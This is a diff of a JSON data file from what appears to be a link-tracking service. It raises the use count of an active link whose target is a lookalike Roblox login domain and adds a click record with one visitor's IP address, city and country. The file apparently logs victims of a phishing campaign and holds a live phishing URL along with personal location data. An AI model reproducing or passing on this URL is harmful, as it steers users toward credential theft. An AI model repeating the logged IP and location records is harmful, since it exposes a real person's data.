@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1447,
+    "useCount": 1448,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11744,6 +11744,14 @@
         "city": "Quito",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777433976334,
+        "ip": "49.150.63.244",
+        "country": "Philippines",
+        "city": "San Fernando",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
